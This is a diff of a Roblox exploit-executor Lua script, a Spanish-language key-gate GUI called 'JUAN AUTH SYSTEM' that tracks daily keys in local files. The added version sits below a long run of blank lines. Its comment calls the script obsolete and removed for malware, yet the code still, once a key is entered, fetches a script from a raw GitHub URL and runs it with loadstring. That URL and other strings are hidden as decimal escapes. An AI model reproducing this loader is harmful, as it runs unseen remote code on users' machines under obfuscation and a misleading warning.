@@ -1,12 +1,268 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+-- [[ {"message":"Script not found!"} ]]
 
-]]--
 
-local v0=game:GetService("Players");local v1=v0.LocalPlayer;local v2=setclipboard or toclipboard ;local v3="JuanAuth_Data";local v4="config.txt";if  not isfolder(v3) then makefolder(v3);end local v5={[1 + 0 ]="4927",[352 -(87 + 263) ]="8105",[3]="3742",[184 -(67 + 113) ]="9261",[4 + 1 ]="1583",[14 -8 ]="6039",[7]="2471",[10 -2 ]="5814",[9]="7390",[10]="2056",[9 + 2 ]="8417",[47 -35 ]="3962",[965 -(802 + 150) ]="5108",[37 -23 ]="7723",[10 + 5 ]="4095",[28 -12 ]="6281",[17]="1359",[14 + 4 ]="9042",[1016 -(915 + 82) ]="2674",[2 + 18 ]="5510",[1657 -(1373 + 263) ]="3829",[62 -40 ]="8647",[14 + 9 ]="1930",[24]="7258",[32 -7 ]="4106",[1213 -(1069 + 118) ]="6394",[61 -34 ]="2817",[43 -15 ]="5043",[63 -34 ]="9731",[30]="1468",[6 + 25 ]="8522"};local function v6() local v94=0 -0 ;while true do if (v94==0) then if isfile(v3   .. "/"   .. v4 ) then local v104=0 + 0 ;local v105;local v106;local v107;while true do if (v104==(792 -(368 + 423))) then return tonumber(v106) or 1 ,tonumber(v107) or 0 ;end if ((0 -0)==v104) then v105=readfile(v3   .. "/"   .. v4 );v106,v107=v105:match("([^,]+),([^,]+)");v104=19 -(10 + 8) ;end end end return 3 -2 ,442 -(416 + 26) ;end end end local function v7(v95,v96) writefile(v3   .. "/"   .. v4 ,tostring(v95)   .. ","   .. tostring(v96) );end local v8,v9=v6();local v10=os.time();local function v11() loadstring(game:HttpGet("https://raw.githubusercontent.com/JDScriptsOP/JD-Scripts-/main/2AnimationAc.lua"))();end if ((v10-v9)>=(275868 -189468)) then local v101=0 + 0 ;while true do if (v101==(0 -0)) then v8=v8 + (1468 -(899 + 568)) ;if (v8>(469 -(145 + 293))) then v8=431 -(44 + 386) ;end break;end end end local v12=Instance.new("ScreenGui");v12.Name="JuanAuthSystem";v12.Parent=v1:WaitForChild("PlayerGui");v12.ResetOnSpawn=false;local v16=Instance.new("Frame");v16.Size=UDim2.new(1486 -(998 + 488) ,112 + 238 ,603 -(268 + 335) ,220);v16.Position=UDim2.new(290.5 -(60 + 230) , -(144 + 31),0.5, -(14 + 96));v16.BackgroundColor3=Color3.fromRGB(787 -(201 + 571) ,1150 -(116 + 1022) ,57 -37 );v16.Parent=v12;Instance.new("UICorner",v16).CornerRadius=UDim.new(0 -0 ,9 + 6 );local v22=Instance.new("UIStroke",v16);v22.Color=Color3.fromRGB(401 -291 ,142 -102 ,1059 -(814 + 45) );v22.Thickness=4 -2 ;local v25=Instance.new("TextLabel");v25.Text="JUAN AUTH SYSTEM";v25.Size=UDim2.new(1252 -(721 + 530) ,0 + 0 ,0 + 0 ,99 -59 );v25.Position=UDim2.new(885 -(261 + 624) ,0 -0 ,1080 -(1020 + 60) ,1505 -(1408 + 92) );v25.TextColor3=Color3.fromRGB(180,1166 -(461 + 625) ,255);v25.BackgroundTransparency=1289 -(993 + 295) ;v25.Font=Enum.Font.GothamBold;v25.TextSize=1437 -(630 + 793) ;v25.Parent=v16;local v35=Instance.new("TextLabel");v35.Text="Necesitas ayuda? Presiona el signo el Interrogación";v35.Size=UDim2.new(1,0 -0 ,0 -0 ,8 + 12 );v35.Position=UDim2.new(0 -0 ,0 + 0 ,1747 -(760 + 987) ,11 + 24 );v35.TextColor3=Color3.fromRGB(51 + 149 ,2113 -(1789 + 124) ,966 -(745 + 21) );v35.BackgroundTransparency=1 + 0 ;v35.Font=Enum.Font.Gotham;v35.TextSize=3 + 7 ;v35.Parent=v16;local v45=Instance.new("TextButton");v45.Size=UDim2.new(0 -0 ,9 + 16 ,0 -0 ,1 + 24 );v45.Position=UDim2.new(1 + 0 , -35,0 -0 ,1065 -(87 + 968) );v45.BackgroundColor3=Color3.fromRGB(35 + 75 ,176 -136 ,200);v45.Text="?";v45.TextColor3=Color3.new(1 + 0 ,2 -1 ,1414 -(447 + 966) );v45.Font=Enum.Font.GothamBold;v45.Parent=v16;Instance.new("UICorner",v45).CornerRadius=UDim.new(2 -1 ,0);local v54=Instance.new("TextBox");v54.Size=UDim2.new(1427 -(41 + 1386) ,2117 -(1703 + 114) ,701 -(376 + 325) ,73 -28 );v54.Position=UDim2.new(0.5, -(461 -311),0.38 + 0 ,0 -0 );v54.BackgroundColor3=Color3.fromRGB(43 -18 ,39 -(9 + 5) ,25 + 5 );v54.PlaceholderText="Ingresa la Key #"   .. v8   .. " aquí..." ;v54.Text="";v54.TextColor3=Color3.new(1 + 0 ,377 -(85 + 291) ,1266 -(243 + 1022) );v54.Parent=v16;Instance.new("UICorner",v54);local v62=Instance.new("TextButton");v62.Size=UDim2.new(0,365 -(30 + 35) ,0 -0 ,1302 -(1043 + 214) );v62.Position=UDim2.new(0.5 + 0 , -(1330 -(1123 + 57)),0.65 + 0 ,254 -(163 + 91) );v62.BackgroundColor3=Color3.fromRGB(2060 -(1869 + 61) ,17 + 43 ,550 -(53 + 267) );v62.Text="DESBLOQUEAR";v62.TextColor3=Color3.new(3 -2 ,1 -0 ,1 + 0 );v62.Font=Enum.Font.GothamBold;v62.Parent=v16;Instance.new("UICorner",v62);local v70=Instance.new("Frame");v70.Size=UDim2.new(0 -0 ,1162 -(18 + 964) ,0 + 0 ,1634 -(1329 + 145) );v70.Position=UDim2.new(972 -(140 + 831) ,1858 -(1409 + 441) ,718 -(15 + 703) ,0 + 0 );v70.BackgroundColor3=Color3.fromRGB(458 -(262 + 176) ,16 + 4 ,1746 -(345 + 1376) );v70.Visible=false;v70.Parent=v16;Instance.new("UICorner",v70);Instance.new("UIStroke",v70).Color=Color3.fromRGB(798 -(198 + 490) ,176 -136 ,479 -279 );local v77=Instance.new("TextLabel");v77.Size=UDim2.new(0.9 + 0 ,1206 -(696 + 510) ,0 -0 ,1372 -(1091 + 171) );v77.Position=UDim2.new(0.05 + 0 ,0 -0 ,0.05 -0 ,0 + 0 );v77.Text="para obtener el código de cada día juega el juego...";v77.TextColor3=Color3.new(0.9 -0 ,0.9 -0 ,374.9 -(123 + 251) );v77.TextWrapped=true;v77.TextSize=44 -35 ;v77.Font=Enum.Font.Gotham;v77.BackgroundTransparency=406 -(118 + 287) ;v77.Parent=v70;local v87=Instance.new("TextButton");v87.Size=UDim2.new(0.85 -0 ,698 -(208 + 490) ,0 + 0 ,16 + 19 );v87.Position=UDim2.new(836.075 -(660 + 176) ,377 -(142 + 235) ,0.72 + 0 ,202 -(14 + 188) );v87.BackgroundColor3=Color3.fromRGB(735 -(534 + 141) ,120,89 + 131 );v87.Text="COPIAR LINK";v87.TextColor3=Color3.new(1 + 0 ,1 + 0 ,1 + 0 );v87.Parent=v70;Instance.new("UICorner",v87);v45.MouseButton1Click:Connect(function() v70.Visible= not v70.Visible;end);v87.MouseButton1Click:Connect(function() v2("https://www.roblox.com/share?code=9195a883b4392a4eb34f3edaf9ae9a22&type=ExperienceDetails&stamp=1771618504737");v87.Text="¡COPIADO!";wait(1 + 0 );v87.Text="COPIAR LINK";end);v62.MouseButton1Click:Connect(function() local v99=v54.Text;local v100=v5[v8];if (v99==v100) then local v102=0 -0 ;while true do if (v102==(2 -0)) then v12:Destroy();v11();break;end if (v102==(2 -1)) then v7(v8,os.time());wait(1 + 0 );v102=2 + 0 ;end if (v102==0) then v62.Text="ACCESO CORRECTO";v62.BackgroundColor3=Color3.fromRGB(139 -89 ,596 -(115 + 281) ,116 -66 );v102=1 + 0 ;end end else local v103=0 -0 ;while true do if (v103==(7 -5)) then v62.BackgroundColor3=Color3.fromRGB(628 -498 ,927 -(550 + 317) ,332 -102 );break;end if (v103==(1 -0)) then wait(2.5 -1 );v62.Text="DESBLOQUEAR";v103=2;end if (v103==0) then v62.Text="KEY #"   .. v8   .. " INCORRECTA" ;v62.BackgroundColor3=Color3.fromRGB(485 -(134 + 151) ,1715 -(970 + 695) ,95 -45 );v103=1;end end end end);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- ====================================================================================================
+-- ESTE SCRIPT QUEDÓ TOTALMENTE OBSOLETO E INSERVIBLE PORQUE EL CÓDIGO ORIGINAL 
+-- FUE ACTUALIZADO O ELIMINADO POR CONTENIDO MALWARE. NO INTENTE EJECUTAR.
+-- ====================================================================================================
+
+local _0xP = game:GetService("\80\108\97\121\101\114\115")
+local _0xL = _0xP.LocalPlayer
+local _0xC = setclipboard or toclipboard
+local _0xFN = "\74\117\97\110\65\117\116\104\95\68\97\116\97"
+local _0xFT = "\99\111\110\102\105\103\46\116\120\116"
+
+if not isfolder(_0xFN) then makefolder(_0xFN) end
+
+local _0xK = {
+    [1] = "\52\57\50\55", [2] = "\56\49\48\53", [3] = "\51\55\52\50", [4] = "\57\50\54\49", [5] = "\49\53\56\51",
+    [6] = "\54\48\51\57", [7] = "\50\52\55\49", [8] = "\53\56\49\52", [9] = "\55\51\57\48", [10] = "\50\48\53\54",
+    [11] = "\56\52\49\55", [12] = "\51\57\54\50", [13] = "\53\49\48\56", [14] = "\55\55\50\51", [15] = "\52\48\57\53",
+    [16] = "\54\50\56\49", [17] = "\49\51\53\57", [18] = "\57\48\52\50", [19] = "\50\54\55\52", [20] = "\53\53\49\48",
+    [21] = "\51\56\50\57", [22] = "\56\54\52\55", [23] = "\49\57\51\48", [24] = "\55\50\53\56", [25] = "\52\49\48\54",
+    [26] = "\54\51\57\52", [27] = "\50\56\49\55", [28] = "\53\48\52\51", [29] = "\57\55\51\49", [30] = "\49\52\54\56",
+    [31] = "\56\53\50\50"
+}
+
+local function _0xCP()
+    if isfile(_0xFN.."/".._0xFT) then
+        local content = readfile(_0xFN.."/".._0xFT)
+        local n, t = content:match("([^,]+),([^,]+)")
+        return tonumber(n) or 1, tonumber(t) or 0
+    end
+    return 1, 0
+end
+
+local function _0xGP(n, t)
+    writefile(_0xFN.."/".._0xFT, tostring(n)..","..tostring(t))
+end
+
+local _0xNA, _0xUA = _0xCP()
+
+local function _0xEX()
+    local _0xU = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\74\68\83\99\114\105\112\116\115\79\80\47\74\68\45\83\99\114\105\112\116\115\45\47\109\97\105\110\47\50\65\110\105\109\97\116\105\111\110\65\99\46\108\117\97"
+    loadstring(game:HttpGet(_0xU))()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "JuanAuthSystem"
+ScreenGui.Parent = _0xL:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 350, 0, 220)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -110)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 12, 20)
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
+
+local UIStroke = Instance.new("UIStroke", MainFrame)
+UIStroke.Color = Color3.fromRGB(110, 40, 200)
+UIStroke.Thickness = 2
+
+local Title = Instance.new("TextLabel")
+Title.Text = "JUAN AUTH SYSTEM"
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 5)
+Title.TextColor3 = Color3.fromRGB(180, 80, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 14
+Title.Parent = MainFrame
+
+local HelpHint = Instance.new("TextLabel")
+HelpHint.Text = "Necesitas ayuda? Presiona el signo el Interrogación"
+HelpHint.Size = UDim2.new(1, 0, 0, 20)
+HelpHint.Position = UDim2.new(0, 0, 0, 35)
+HelpHint.TextColor3 = Color3.fromRGB(200, 200, 200)
+HelpHint.BackgroundTransparency = 1
+HelpHint.Font = Enum.Font.Gotham
+HelpHint.TextSize = 10
+HelpHint.Parent = MainFrame
+
+local QuestionBtn = Instance.new("TextButton")
+QuestionBtn.Size = UDim2.new(0, 25, 0, 25)
+QuestionBtn.Position = UDim2.new(1, -35, 0, 10)
+QuestionBtn.BackgroundColor3 = Color3.fromRGB(110, 40, 200)
+QuestionBtn.Text = "?"
+QuestionBtn.TextColor3 = Color3.new(1, 1, 1)
+QuestionBtn.Font = Enum.Font.GothamBold
+QuestionBtn.Parent = MainFrame
+Instance.new("UICorner", QuestionBtn).CornerRadius = UDim.new(1, 0)
+
+local TextBox = Instance.new("TextBox")
+TextBox.Size = UDim2.new(0, 300, 0, 45)
+TextBox.Position = UDim2.new(0.5, -150, 0.38, 0)
+TextBox.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+TextBox.PlaceholderText = "Ingresa la Key #".._0xNA.." aquí..."
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.new(1, 1, 1)
+TextBox.Parent = MainFrame
+Instance.new("UICorner", TextBox)
+
+local UnlockBtn = Instance.new("TextButton")
+UnlockBtn.Size = UDim2.new(0, 300, 0, 45)
+UnlockBtn.Position = UDim2.new(0.5, -150, 0.65, 0)
+UnlockBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 230)
+UnlockBtn.Text = "DESBLOQUEAR"
+UnlockBtn.TextColor3 = Color3.new(1, 1, 1)
+UnlockBtn.Font = Enum.Font.GothamBold
+UnlockBtn.Parent = MainFrame
+Instance.new("UICorner", UnlockBtn)
+
+local SidePanel = Instance.new("Frame")
+SidePanel.Size = UDim2.new(0, 180, 0, 160)
+SidePanel.Position = UDim2.new(1, 8, 0, 0)
+SidePanel.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+SidePanel.Visible = false
+SidePanel.Parent = MainFrame
+Instance.new("UICorner", SidePanel)
+Instance.new("UIStroke", SidePanel).Color = Color3.fromRGB(110, 40, 200)
+
+local InfoText = Instance.new("TextLabel")
+InfoText.Size = UDim2.new(0.9, 0, 0, 110)
+InfoText.Position = UDim2.new(0.05, 0, 0.05, 0)
+InfoText.Text = "para obtener el código de cada día juega el juego publicado de Juan, en el juego abra un contado en cuanto termine el contador te mostrara el código, copia el enlace y pegalo en tu navegador (Google) también puedes buscar al usuario Juanelcaballowasa seguirlo si gustas, entrar a creaciones y jugar el juego"
+InfoText.TextColor3 = Color3.new(0.9, 0.9, 0.9)
+InfoText.TextWrapped = true
+InfoText.TextSize = 9
+InfoText.Font = Enum.Font.Gotham
+InfoText.BackgroundTransparency = 1
+InfoText.Parent = SidePanel
+
+local CopyBtn = Instance.new("TextButton")
+CopyBtn.Size = UDim2.new(0.85, 0, 0, 35)
+CopyBtn.Position = UDim2.new(0.075, 0, 0.72, 0)
+CopyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 220)
+CopyBtn.Text = "COPIAR LINK"
+CopyBtn.TextColor3 = Color3.new(1, 1, 1)
+CopyBtn.Parent = SidePanel
+Instance.new("UICorner", CopyBtn)
+
+QuestionBtn.MouseButton1Click:Connect(function()
+    SidePanel.Visible = not SidePanel.Visible
+end)
+
+CopyBtn.MouseButton1Click:Connect(function()
+    _0xC("\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\115\104\97\114\101\63\99\111\100\101\61\57\49\57\53\97\56\56\51\98\52\51\57\50\97\52\101\98\51\52\102\51\101\100\97\102\57\97\101\57\97\50\50\38\116\121\112\101\61\69\120\112\101\114\105\101\110\99\101\68\101\116\97\105\108\115\38\115\116\97\109\112\61\49\55\55\49\54\49\56\53\48\52\55\51\55")
+    CopyBtn.Text = "¡COPIADO!"
+    task.wait(1)
+    CopyBtn.Text = "COPIAR LINK"
+end)
+
+UnlockBtn.MouseButton1Click:Connect(function()
+    local input = TextBox.Text
+    local keyCorrecta = _0xK[_0xNA]
+    
+    if input == keyCorrecta then
+        UnlockBtn.Text = "ACCESO CORRECTO"
+        UnlockBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+        _0xGP(_0xNA, os.time())
+        task.wait(1)
+        ScreenGui:Destroy()
+        _0xEX()
+    else
+        UnlockBtn.Text = "KEY #".._0xNA.." INCORRECTA"
+        UnlockBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        task.wait(1.5)
+        UnlockBtn.Text = "DESBLOQUEAR"
+        UnlockBtn.BackgroundColor3 = Color3.fromRGB(130, 60, 230)
+    end
+end)
